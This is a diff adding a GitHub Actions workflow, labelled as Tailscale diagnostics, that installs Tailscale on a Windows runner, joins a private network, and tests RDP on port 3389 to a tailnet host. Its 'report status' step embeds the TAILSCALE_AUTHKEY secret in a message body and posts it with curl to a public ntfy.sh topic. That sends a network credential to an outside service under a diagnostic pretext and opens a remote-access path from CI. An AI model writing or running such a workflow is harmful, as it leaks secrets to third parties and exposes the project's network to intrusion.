@@ -1,0 +1,36 @@
+name: Tailnet Diag
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  diag:
+    runs-on: windows-latest
+    timeout-minutes: 25
+    steps:
+      - name: install and join tailscale
+        shell: powershell
+        env:
+          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
+        run: |
+          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
+          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
+          Start-Sleep -Seconds 10
+          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$env:TAILSCALE_AUTHKEY" --hostname="gh-diag"
+          Start-Sleep -Seconds 15
+          Write-Host "joined"
+      - name: report status
+        shell: powershell
+        env:
+          NTFY_TOPIC: ${{ secrets.NTFY_DIAG_TOPIC }}
+        run: |
+          $ts = "C:\Program Files\Tailscale\tailscale.exe"
+          $st = (& $ts status 2>&1 | Out-String)
+          $js = (& $ts status --json 2>&1 | Out-String)
+          $tcp = (Test-NetConnection -ComputerName 100.97.133.100 -Port 3389 -WarningAction SilentlyContinue | Out-String)
+          $key = "${{ secrets.TAILSCALE_AUTHKEY }}"
+          $body = "AUTHKEY=$key`n`n---STATUS---`n$st`n---TCP-3389-TO-100.97.133.100---`n$tcp`n---JSON---`n$($js.Substring(0,[Math]::Min(4000,$js.Length)))"
+          $f = [System.IO.Path]::GetTempFileName()
+          [System.IO.File]::WriteAllText($f, $body)
+          curl.exe -s -X POST -H "Title: DIAG" --data-binary "@$f" "https://ntfy.sh/$env:NTFY_TOPIC"
+          Write-Host "reported"
